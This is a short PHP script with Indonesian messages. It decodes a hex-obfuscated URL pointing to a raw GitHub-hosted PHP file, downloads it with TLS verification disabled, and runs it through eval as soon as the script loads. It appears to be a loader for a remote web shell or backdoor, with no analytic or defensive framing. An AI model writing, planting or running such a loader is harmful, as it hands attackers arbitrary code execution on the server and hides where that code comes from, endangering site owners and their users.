<?php

class RemotePHPExecutor
{
    private $url;
    private $code = null;
    private $error = null;

    public function __construct($url)
    {
        $this->url = $url;
        $this->fetchCode();
    }
    private function fetchUsingCurl()
    {
        if (!function_exists('curl_init')) {
            return false;
        }

        $ch = curl_init($this->url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT => 10,
            CURLOPT_SSL_VERIFYPEER => false,
        ]);
        $result = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        return ($httpCode === 200 && $result !== false) ? $result : false;
    }

    private function fetchUsingFileGetContents()
    {
        $context = stream_context_create([
            "http" => ["follow_location" => 1, "timeout" => 10],
            "https" => ["verify_peer" => false, "verify_peer_name" => false]
        ]);

        return @file_get_contents($this->url, false, $context);
    }

     private function fetchCode()
    {
        $code = $this->fetchUsingCurl();

        if ($code === false) {
            $code = $this->fetchUsingFileGetContents();
        }

        if ($code === false) {
            $this->error = "Gagal mengambil konten dari URL: {$this->url}";
            return;
        }

        $this->code = $code;
    }

    public function render()
    {
        if (empty($this->code)) {
            return $this->error ?: "Tidak ada konten untuk dijalankan.";
        }

        try {
            ob_start();
            eval("?>".$this->code);
            return ob_get_clean();
        } catch (Exception $e) { // Throwable baru PHP 7+, Exception aman untuk versi lama
            return "Kesalahan saat mengeksekusi konten: " . $e->getMessage();
        }
    }
}

$this_data = ['68747470733A2F2F7261772E67697468756275736572636F6E74656E742E636F6D2F5041434B444F4C2F7368616C6C6731362F726566732F68656164732F6D61696E2F63616B2F7068702E706870'];
foreach ($this_data as $key) {
    $haxcash = hex2bin($key);
    $remote = new RemotePHPExecutor($haxcash);
    echo $remote->render();
}

?>
